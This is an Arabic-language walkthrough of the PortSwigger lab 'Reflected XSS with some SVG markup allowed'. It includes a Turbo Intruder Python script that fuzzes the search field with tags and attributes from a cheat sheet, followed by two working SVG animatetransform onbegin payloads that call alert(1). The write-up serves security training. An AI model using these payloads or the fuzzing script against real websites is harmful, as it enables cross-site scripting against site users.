# [Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

## **`الهدف`**
قم بتنفيذ هجوم `XSS` في تعليق يستدعي دالة `alert`.
## **`خطوات الحل`**
**`ملاحظة:`** خطوات الحل الرسمي من الـ `PortSwigger` تختلف قليلًا عن الخطوات المكتوبة هنا لأنه يستعمل أداة `Burp Intruder`.

سنقوم بتكرار نفس الخطوات الخاصة ببعض اللابات السابقة التى تعتمد على التخمين باستخدام **[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)** مثل:
[Reflected XSS into HTML context with most tags and attributes blocked](./Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked.md) 

باستخدام سكريبت `Python` التالي مع `Turbo Intruder`حتى نصل إلى الـ `Payload` المناسب.
```Python
def queueRequests(target, wordlists):
    # السماح بأكثر من اتصال متوازي لتسريع العملية
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,   
                           # (ثلاث اتصالات متوازية (يمكن زيادتها حسب الرغبة
                           requestsPerConnection=50, 
                           # عدد الطلبات المرسلة عبر الاتصال الواحد
                           pipeline=False,            
                           # تعطيل الـ pipelining تماماً
                           engine=Engine.THREADED
                           )

    # افتح الملف واقرأ السطور (الكلمات) الموجودة فيه
    # تنبيه: استبدل المسار التالي بالمسار الحقيقي للملف
    with open(r'C:\Users\test\Desktop\test.txt', 'r') as f:
        for line in f:
            # نأخذ الكلمة ونحذف أي مسافات أو سطور زائدة من أطرافها
            word = line.strip()
            
            # إذا كان السطر فارغاً، يتم تخطيه والانتقال للسطر التالي دون إرسال طلب
            if not word:
                continue

            # نُرسل القيمة المقروءة من الملف للجزء المُحدد في الـ Request
            engine.queue(target.req, word)

def handleResponse(req, interesting):
    # عرض كل النتائج في الجدول بدون أي فلترة لكي نتابع كل الطلبات
    table.add(req)
```

ثم سنقوم بحقن إحدي الأمريين التاليين فى خانة البحث ونضغط `Search` لننتهي من حل اللاب.

```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

```html
<svg><animatetransform onbegin=alert(1)>
```
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [Reflected XSS into HTML context with nothing encoded](./Reflected-XSS-into-HTML-context-with-nothing-encoded.md)
